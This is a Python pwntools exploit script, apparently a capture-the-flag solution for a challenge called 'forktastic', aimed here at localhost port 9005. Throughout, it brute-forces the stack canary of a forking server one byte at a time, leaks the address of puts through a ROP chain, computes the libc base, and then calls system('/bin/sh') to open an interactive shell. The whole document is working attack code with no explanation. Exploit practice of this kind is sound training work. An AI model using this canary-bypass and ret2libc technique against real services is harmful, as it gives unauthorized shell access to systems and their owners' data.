from pwn import *

#TARGET = "forktastic.heltsikker.no"
TARGET = "localhost"


elf = ELF("./source/forktastic")
rop = ROP(elf)
libc = ELF("./source/libc-2.27.so")

padding = b"A"*72
cookie = b''

while len(cookie) < 8:
    for x in range(256):
        guess = cookie + x.to_bytes(1, "little")
        r = remote(TARGET, 9005)
        r.send(padding + guess)
        sleep(0.1)
        if b"stack smashing" not in r.recv():
            r2 = remote(TARGET, 9005)
            r2.send(padding + guess)
            sleep(1)
            if b"stack smashing" not in r2.recv():
                cookie = guess
                log.info("Found a byte of stack canary: " + str(x.to_bytes(1, "little")))
                break
            r2.close()
        r.close()

log.success("Found the full stack canary: " + str(cookie))


puts = p64(0x401170) # for some reason symbols["puts"] is the GOT entry and not PLT, gotta do it the oldschool way...
puts_got = p64(elf.got["puts"])
do_stuff = p64(elf.symbols["do_stuff"])
pop_rdi = p64(rop.search(regs=["rdi"])[0])
ret = p64(rop.search(regs=[])[0])


r = remote(TARGET, 9005)
r.sendline(padding + cookie + p64(0x0) + pop_rdi + puts_got + puts + do_stuff)
r.recvline()
r.recvline()
leak = u64(r.recvline()[:-1].ljust(8, b"\x00"))

log.info("Puts: " + hex(leak))
libc.address = leak - libc.symbols["puts"]
log.info("Libc base: " + hex(libc.address))

bin_sh = p64(next(libc.search(b"/bin/sh")))
system = p64(libc.symbols["system"])

log.info("/bin/sh: " + hex(u64(bin_sh)))
log.info("system: " + hex(u64(system)))

log.success("Spawning shell!")

r.sendline(padding + cookie + p64(0x0) + ret + pop_rdi + bin_sh + system)
r.recvline()
r.interactive()
